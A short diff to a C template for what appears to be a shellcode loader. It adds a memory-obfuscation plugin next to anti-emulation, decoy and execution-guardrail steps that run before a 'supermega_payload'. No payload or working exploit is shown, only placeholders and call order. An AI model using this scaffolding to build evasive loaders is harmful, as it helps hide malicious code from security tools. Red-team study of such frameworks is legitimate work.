@@ -2,6 +2,7 @@
 
 #include <time.h>
 
+
 char *supermega_payload;
 
 #define p_RW  0x04
@@ -14,6 +15,8 @@ char *supermega_payload;
 {{plugin_decoy}}
 
 {{plugin_executionguardrail}}
+
+{{plugin_memoryobfuscation}}
 
 {{plugin_virtualprotect}}
 
@@ -34,6 +37,9 @@ int main()
 
 	// Call: Anti Emulation plugin
 	antiemulation();
+
+	// Call: Memory Obfuscation plugin
+        memoryobfuscation();
 
 	// Call: Decoy plugin
 	decoy();
